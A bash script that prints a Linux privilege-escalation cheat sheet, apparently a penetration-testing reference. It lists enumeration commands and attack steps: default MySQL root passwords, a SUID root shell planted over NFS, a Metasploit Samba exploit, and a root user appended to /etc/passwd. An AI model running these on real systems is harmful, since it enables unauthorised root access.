#!/bin/bash

# === Color Variables ===
HEADER='\033[1;34m'
SUBHEADER='\033[1;33m'
COMMAND='\033[1;32m'
RESET='\033[0m'

echo -e "\n${HEADER}#==========================#"
echo -e "#   S1REN: Path to Root    #"
echo -e "#==========================#${RESET}"

echo -e "\n${SUBHEADER}#-> g0tmilk's Linux PrivEsc Guide${RESET}"
echo -e "${COMMAND}https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/${RESET}"

echo -e "\n${SUBHEADER}#-> Initial Shell Handling${RESET}"
echo -e "${COMMAND}python -c 'import pty; pty.spawn(\"/bin/bash\")'${RESET}"
echo -e "${COMMAND}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'${RESET}"
echo -e "${COMMAND}export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp${RESET}"
echo -e "${COMMAND}export TERM=xterm-256color${RESET}"
echo -e "${COMMAND}alias ll='ls -lsaht --color=auto'${RESET}"
echo -e "${COMMAND}Ctrl + Z${RESET}"
echo -e "${COMMAND}stty raw -echo ; fg ; reset${RESET}"
echo -e "${COMMAND}stty columns 200 rows 200${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#    Capability Checks     #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}which gcc${RESET}"
echo -e "${COMMAND}which cc${RESET}"
echo -e "${COMMAND}which python${RESET}"
echo -e "${COMMAND}which perl${RESET}"
echo -e "${COMMAND}which wget${RESET}"
echo -e "${COMMAND}which curl${RESET}"
echo -e "${COMMAND}which fetch${RESET}"
echo -e "${COMMAND}which nc${RESET}"
echo -e "${COMMAND}which ncat${RESET}"
echo -e "${COMMAND}which nc.traditional${RESET}"
echo -e "${COMMAND}which socat${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#       System Info        #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}file /bin/bash${RESET}"
echo -e "${COMMAND}uname -a${RESET}"
echo -e "${COMMAND}cat /etc/*-release${RESET}"
echo -e "${COMMAND}cat /etc/issue${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#  Privilege Enumeration   #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}sudo -l${RESET}"
echo -e "${COMMAND}ls -lsaht /etc/sudoers${RESET}"
echo -e "${COMMAND}groups \$(whoami)${RESET}"
echo -e "${COMMAND}env${RESET}"
echo -e "${COMMAND}cd /home/ && ls -lsaht${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#   Credentials & Configs  #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}cd /var/www/html/ && ls -lsaht${RESET}"
echo -e "${COMMAND}cd /etc/ && ls -lsaht | grep -i '.conf'${RESET}"
echo -e "${COMMAND}ls -lsaht | grep -i '.secret'${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#     SUID / GUID Bins     #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}find / -perm -u=s -type f 2>/dev/null${RESET}"
echo -e "${COMMAND}find / -perm -g=s -type f 2>/dev/null${RESET}"
echo -e "${COMMAND}getcap -r / 2>/dev/null${RESET}"
echo -e "${COMMAND}https://gtfobins.github.io/${RESET}"
echo -e "${COMMAND}https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#     Live Monitoring      #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}cd /var/tmp/${RESET}"
echo -e "${COMMAND}chmod 755 pspy32 pspy64${RESET}"
echo -e "${COMMAND}./pspy64${RESET}"
echo -e "${COMMAND}https://github.com/DominicBreuker/pspy${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#   Network Enumeration    #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}netstat -antup${RESET}"
echo -e "${COMMAND}netstat -tunlp${RESET}"
echo -e "${COMMAND}ps aux |grep -i 'root' --color=auto${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#   MySQL Credentials      #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}mysql -uroot -p${RESET}"
echo -e "${COMMAND}root : root${RESET}"
echo -e "${COMMAND}root : toor${RESET}"
echo -e "${COMMAND}root : [blank]${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#     User SSH Keys        #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}ls -lsaR /home/${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#     Other Locations      #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}ls -lsaht /var/lib/${RESET}"
echo -e "${COMMAND}ls -lsaht /var/db/${RESET}"
echo -e "${COMMAND}ls -lsaht /opt/${RESET}"
echo -e "${COMMAND}ls -lsaht /tmp/${RESET}"
echo -e "${COMMAND}ls -lsaht /var/tmp/${RESET}"
echo -e "${COMMAND}ls -lsaht /dev/shm/${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#   File Transfer Tools    #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}which wget${RESET}"
echo -e "${COMMAND}which curl${RESET}"
echo -e "${COMMAND}which nc${RESET}"
echo -e "${COMMAND}which fetch${RESET}"
echo -e "${COMMAND}ls -lsaht /bin/ |grep -i 'ftp' --color=auto${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#      NFS Exploitation    #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}cat /etc/exports${RESET}"
echo -e "${COMMAND}https://recipeforroot.com/attacking-nfs-shares/${RESET}"

echo -e "\n${COMMAND}[Attacker] mkdir -p /mnt/nfs/${RESET}"
echo -e "${COMMAND}[Attacker] mount -t nfs -o vers=3 \$IP:/export /mnt/nfs/ -nolock${RESET}"
echo -e "${COMMAND}[Attacker] cp suid /mnt/nfs/ && chmod u+s /mnt/nfs/suid${RESET}"
echo -e "${COMMAND}[Victim] ./suid -> root shell${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#      Writable Paths      #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}/var/tmp/${RESET}"
echo -e "${COMMAND}/tmp/${RESET}"
echo -e "${COMMAND}/dev/shm/${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#    Exotic FS / fstab     #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}cat /etc/fstab${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#    Forwarding Services   #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}meterpreter> portfwd add –l 139 –p 139 –r [target]${RESET}"
echo -e "${COMMAND}use exploit/linux/samba/trans2open${RESET}"
echo -e "${COMMAND}set RHOSTS 0.0.0.0${RESET}"
echo -e "${COMMAND}run${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#  /etc/passwd Injection   #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}openssl passwd -1${RESET}"
echo -e "${COMMAND}echo 'siren:\$1\$hash:0:0:siren:/root:/bin/bash' >> /etc/passwd${RESET}"
echo -e "${COMMAND}su siren${RESET}"
echo -e "${COMMAND}id${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#       Cron Jobs          #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}crontab -u root -l${RESET}"
echo -e "${COMMAND}cat /etc/crontab${RESET}"
echo -e "${COMMAND}ls /etc/cron.*${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#     Find User Files      #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}find / -user miguel 2>/dev/null${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#       Mail Check         #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}cd /var/mail/ && ls -lsaht${RESET}"

echo -e "\n${HEADER}#==========================#"
echo -e "#     Enumeration Tools    #"
echo -e "#==========================#${RESET}"

echo -e "${COMMAND}LinPEAS → https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite${RESET}"
echo -e "${COMMAND}Traitor → https://github.com/liamg/traitor${RESET}"
echo -e "${COMMAND}GTFOBins → https://gtfobins.github.io/${RESET}"
echo -e "${COMMAND}PSpy → https://github.com/DominicBreuker/pspy${RESET}"

echo -e "\n${YELLOW}${BOLD}# Finished printing S1REN's Linux PrivEsc Reference Guide${RESET}"
